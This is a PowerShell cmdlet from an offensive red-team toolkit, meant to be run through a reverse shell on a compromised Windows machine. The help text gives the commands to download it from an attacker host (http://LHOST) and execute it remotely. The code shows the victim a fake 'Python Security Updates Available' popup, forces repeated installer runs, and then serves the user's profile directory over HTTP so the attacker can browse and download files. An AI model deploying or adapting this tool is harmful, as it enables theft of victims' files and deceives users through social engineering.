<#
.SYNOPSIS
   cmdlet to read/browse/download files from compromised target machine (windows).

   Author: r00t-3xp10it (SSA RedTeam @2020)
   Tested Under: Windows 10 - Build 18363
   Required Dependencies: python (http.server)
   Optional Dependencies: curl|Start-BitsTransfer
   PS cmdlet Dev version: v1.5

.DESCRIPTION
   This cmdlet has written to assist venom amsi evasion reverse tcp shell's (agents)
   with the ability to download files from target machine. It uses social engineering
   to trick target user into installing Python-3.9.0.exe as a python security update
   if the target user does not have python installed. This cmdlet then uses curl native
   binary (LolBin) to download/execute the python windows installer from www.python.org
   The follow 4 steps describes how to use webserver.ps1 on venom reverse tcp shell's

   1º - Place this cmdlet in attacker machine apache2 webroot
        execute: cp venom/aux/webserver.ps1 /var/www/html/webserver.ps1

   2º - Then upload the webserver using the reverse tcp shell prompt (handler)
        execute: cmd /c curl http://LHOST/webserver.ps1 -o %tmp%\webserver.ps1

   3º - Now remote execute webserver using the reverse tcp shell prompt (handler)
        execute: powershell -W 1 -File "$Env:TMP\webserver.ps1" -SForce 3 -STime 16

   4º - In attacker PC access 'http://RHOST/8086/' (web browser) to read/browse/download files.

.NOTES
   Use 'CTRL+C' to stop the webserver (Local)
   Using 'CTRL+C' remote stops the reverse tcp shell connection
   (agent) But it will NOT stop the webserver.ps1 from running.  

   cmd /c taskkill /F /IM Python.exe
   Kill remote Python process (stop webserver.ps1)

   If executed without administrator privileges then this cmdlet
   its limmited to directory ACL permissions (F)(R)(W) atributes.

.EXAMPLE
   PS C:\> Get-Help .\webserver.ps1 -full
   Access This cmdlet Comment_Based_Help

.EXAMPLE
   PS C:\> .\webserver.ps1
   Spawn webserver in '$Env:UserProfile' directory on port 8086

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "C:\Users\pedro\Desktop"
   Spawn webserver in the sellected directory on port 8086

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SPort 8111
   Spawn webserver in the sellected directory on port 8111

.EXAMPLE
   PS C:\> .\webserver.ps1 -SPath "$Env:TMP" -SBind 192.168.1.72
   Spawn webserver in the sellected directory and bind to ip addr

.EXAMPLE
   PS C:\> .\webserver.ps1 -SForce 10 -STime 16
   force remote user to execute the python windows installer
   (10 attempts) and 16 Seconds delay between install attempts.
   'Its the syntax that gives us more guarantees of success!'. 

.INPUTS
   None. You cannot pipe objects into webserver.ps1

.OUTPUTS
   None. This cmdlet does not produce outputs (remotely)
   But if executed Locally it will produce terminal displays.

.LINK
    https://github.com/r00t-3xp10it/venom
    https://github.com/r00t-3xp10it/venom/tree/master/aux/webserver.ps1
    https://github.com/r00t-3xp10it/venom/wiki/webserver.md
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$SPath="$Env:UserProfile",
   [int]$SPort='8086',
   [int]$STime='16',
   [int]$SForce='0',
   [string]$SBind
)

$HiddeMsgBox = $False
$CmdletVersion = "v1.5"
#$Initial_Path = (pwd).Path
$Server_hostName = (hostname)
$Server_Working_Dir = "$SPath"
$Remote_Server_Port = "$Sport"
$IsArch64 = [Environment]::Is64BitOperatingSystem
If($IsArch64 -eq $True){
   $BinName = "python-3.9.0-amd64.exe"
}Else{
   $BinName = "python-3.9.0.exe"
}

## Simple HTTP WebServer Banner
$host.UI.RawUI.WindowTitle = "@webserver $CmdletVersion {SSA@RedTeam}"
$Banner = @"
░░     ░░ ░░░░░░░ ░░░░░░  ░░░░░░░ ░░░░░░░ ░░░░░░  ░░    ░░ ░░░░░░░ ░░░░░░  
▒▒     ▒▒ ▒▒      ▒▒   ▒▒ ▒▒      ▒▒      ▒▒   ▒▒ ▒▒    ▒▒ ▒▒      ▒▒   ▒▒ 
▒▒  ▒  ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  ▒▒▒▒▒▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  ▒▒    ▒▒ ▒▒▒▒▒   ▒▒▒▒▒▒  
▓▓ ▓▓▓ ▓▓ ▓▓      ▓▓   ▓▓      ▓▓ ▓▓      ▓▓   ▓▓  ▓▓  ▓▓  ▓▓      ▓▓   ▓▓ 
 ███ ███  ███████ ██████  ███████ ███████ ██   ██   ████   ███████ ██   ██ $CmdletVersion
         Simple (SE) HTTP WebServer by:r00t-3xp10it {SSA@RedTeam}

"@;
Clear-Host;
Write-Host $Banner;

$PythonVersion = cmd /c python --version
If(-not($PythonVersion) -or $PythonVersion -eq $null){
   write-host "Python not found, Downloading from www.python.org .." -ForeGroundColor DarkRed -BackgroundColor Cyan
   Start-Sleep -Seconds 1

   <#
   .SYNOPSIS
      Download/Install Python 3.9.0 => http.server (requirement)
      Author: @r00t-3xp10it (venom Social Engineering Function)

   .DESCRIPTION
      Checks target system architecture (x64 or x86) to download from Python
      oficial webpage the comrrespondent python 3.9.0 windows installer if
      target system does not have the python http.server module installed ..

   .NOTES
      This function uses the native (windows 10) curl.exe LolBin to
      download python-3.9.0.exe before remote execute the installer
   #>

   If(cmd /c curl.exe --version){ # <-- Unnecessary step? curl its native (windows 10) rigth?
      ## Download python windows installer and use social engineering to trick user to install it
      write-host "Downloading $BinName from python.org" -ForeGroundColor Green
      cmd /c curl.exe -L -k -s https://www.python.org/ftp/python/3.9.0/$BinName -o %tmp%\$BinName -u SSARedTeam:s3cr3t
      Write-Host "Remote Spawning Social Engineering MsgBox." -ForeGroundColor Green
      powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$Server_hostName - $BinName setup",4+64)|Out-Null
      $HiddeMsgBox = $True
      If(Test-Path "$Env:TMP\$BinName"){
         ## Execute python windows installer
         powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
      }Else{
         $SForce = '4'
         ## Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
         Write-Host "File: $Env:TMP\$BinName => not found" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
         Write-Host "Activate -SForce parameter to use powershell Start-BitsTransfer" -ForeGroundColor Green;Start-Sleep -Seconds 2
      }
   }Else{
      $SForce = '4'
      ## LolBin downloader (curl) not found in current system.
      # Activate -SForce parameter to use powershell Start-BitsTransfer cmdlet insted of curl.exe
      Write-Host "[Abort] Curl downloder (LolBin) => not found .." -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
      Write-Host "Activate -SForce parameter to use powershell Start-BitsTransfer" -ForeGroundColor Green;Start-Sleep -Seconds 2
   }
}

<#
.SYNOPSIS
   parameter: -SForce 3 -STime 30
   force remote user to execute the python windows installer
   (3 attempts) and use 30 Seconds between install attempts.
   Author: @r00t-3xp10it (venom Social Engineering Function)

.DESCRIPTION
   This parameter forces the installation of python-3.9.0.exe
   by looping between python-3.9.0.exe executions until python
   its installed OR the number of attempts set by user in -SForce
   parameter its reached. Example of how to to force the install
   of python in remote host 3 times: .\webserver.ps1 -SForce 3

.NOTES
   'Its the syntax that gives us more guarantees of success!'.
   This function uses powershell Start-BitsTransfer cmdlet to
   download python-3.9.0.exe before remote execute the installer
#>

If($SForce -gt 0){
$i = 0 ## Loop counter
$Success = $False ## Python installation status

    ## Loop Function (Social Engineering)
    # Hint: $i++ increases the nº of the $i counter
    Do {
        $check = cmd /c python --version
        ## check target host python version
        If(-not($check) -or $check -eq $null){
            $i++;Write-Host "[$i] Python Installation => not found" -ForeGroundColor DarkRed -BackgroundColor Cyan
            ## Test if installler exists on remote directory
            If(Test-Path "$Env:TMP\$BinName"){
               If($HiddeMsgBox -eq $False){
                   Write-Host "[$i] Remote Spawning Social Engineering MsgBox." -ForeGroundColor Green;Start-Sleep -Seconds 1
                   powershell (NeW-ObjeCt -ComObjEct Wscript.Shell).Popup("Python Security Updates Available.`nDo you wish to Install them now?",15,"$Server_hostName - $BinName setup",4+64)|Out-Null;
                   $HiddeMsgBox = $True
               }
               ## Execute python windows installer
               Write-Host "[$i] python windows installer => found" -ForeGroundColor Green;Start-Sleep -Seconds 1
               powershell Start-Process -FilePath "$Env:TMP\$BinName" -Wait
               Start-Sleep -Seconds $STime # 16+4 = 20 seconds between executions (default value)
            }Else{
               ## python windows installer not found, download it ..
               Write-Host "[$i] python windows installer => not found .." -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 1
               Write-Host "[$i] Downloading => $Env:TMP\$BinName" -ForeGroundColor DarkRed -BackgroundColor Cyan;Start-Sleep -Seconds 2
               powershell -w 1 Start-BitsTransfer -Priority foreground -Source https://www.python.org/ftp/python/3.9.0/$BinName -Destination $Env:TMP\$BinName
            }
         ## Python Successfull Installed ..
         # Mark $Success variable to $True to break SE loop
         }Else{
            $i++;Write-Host "[$i] Python Installation => found" -ForeGroundColor Green
            Start-Sleep -Seconds 2;$Success = $True
         }
    }
    ## DO Loop UNTIL $i (Loop set by user or default value counter) reaches the
    # number input on parameter -SForce OR: if python is $success=$True (found).
    Until($i -eq $SForce -or $Success -eq $True)
}


$Installation = cmd /c python --version
## Make Sure python http.server requirement its satisfied.
If(-not($Installation) -or $Installation -eq $null){
   write-host "[Abort] This cmdlet cant find => Python installation .." -ForeGroundColor DarkRed -BackgroundColor Cyan
   Start-Sleep -Seconds 2
}Else{
   write-host "All Python requirements are satisfied." -ForeGroundColor Green
   Start-Sleep -Seconds 1
   If(-not($SBind) -or $SBind -eq $null){
      ## Grab remote target IPv4 ip address (to --bind)
      $Remote_Host = (Test-Connection -ComputerName (hostname) -Count 1 -ErrorAction SilentlyContinue).IPV4Address.IPAddressToString
   }Else{
      ## Use the cmdlet parameter (to --bind)
      $Remote_Host = "$SBind"
   }

   ## Start python http server on sellect Ip/Path/Port
   write-host "Serving HTTP webserver on '$Server_Working_Dir'" -ForeGroundColor Green;Start-Sleep -Seconds 1
   cmd /c python -m http.server --directory $Server_Working_Dir --bind $Remote_Host $Remote_Server_Port
   If($? -eq $False){write-host "[Fail] python http.server => failed execution." -ForeGroundColor DarkRed -BackgroundColor Cyan}
}
## Final Notes:
# The 'cmd /c' syscall its used in certain ocasions in this cmdlet only because
# it produces less error outputs in terminal prompt compared with PowerShell.
exit
